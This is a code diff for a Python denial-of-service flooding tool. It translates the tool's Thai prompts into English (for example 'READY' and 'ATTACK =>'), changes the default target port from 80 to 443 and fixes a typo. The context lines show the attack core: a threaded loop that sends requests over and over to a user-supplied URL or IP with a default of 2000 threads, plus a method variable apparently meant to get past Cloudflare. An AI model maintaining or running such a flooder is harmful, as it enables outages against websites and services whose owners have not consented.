@@ -50,7 +50,7 @@ def start_url():
             down
             os.system("node-v12.13.0-x64.msi")
     logo()
-    url = input("ใส่ [URL/IP]: ").strip()
+    url = input("enter [URL/IP]: ").strip()
     if url == "":
         start_url()
     url_main = url
@@ -82,15 +82,15 @@ def start_port():
                 port = int(80)
                 print(" Selected Port = 80")
         else:
-            port = int(80)
-            print(" Selected Port = 80 ")
+            port = int(443)
+            print(" Selected Port = 443")
     else:
         port = int(port)
 
 def start_mode():
     global choice_mode, filenam1, filenam2, method_pass_cf
     print("")
-    choice_mode = input(" MODE [TYE 0] ")
+    choice_mode = input(" MODE [TYPE 0] ")
     if choice_mode == "0":
         filenam2 = "Home"
         logo()
@@ -102,7 +102,7 @@ def start_mode():
 
 def choice_method_attack():
     global method_attack, name_method_attack
-    print("ใส่ 2 ")
+    print("MODE Attack")
     method_attack = input("Choice Request [1/2]: ")
     if (method_attack == "1") or (method_attack == ""):
         name_method_attack = "Normal"
@@ -125,12 +125,12 @@ def numthreads():
         threads = int(input(" Threads [2000]: "))
     except ValueError:
         threads = int(2000)
-        print (" กำลัง " +str(threads)+ " [!]\n")
+        print ("RUN " +str(threads)+ " [!]\n")
     logo()
     begin()
 
 def begin():
-    choice6 = input('พร้อมยิง')
+    choice6 = input('READY')
     if choice6 == "":
         attack()
         print()
@@ -175,7 +175,7 @@ class Home(threading.Thread):
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
-                        print("กำลังยิง "  " => " +str(host_url)+ ":" +str(port))
+                        print("ATTACK "  " => " +str(host_url)+ ":" +str(port))
                 except:
                     try:
                         s.close()
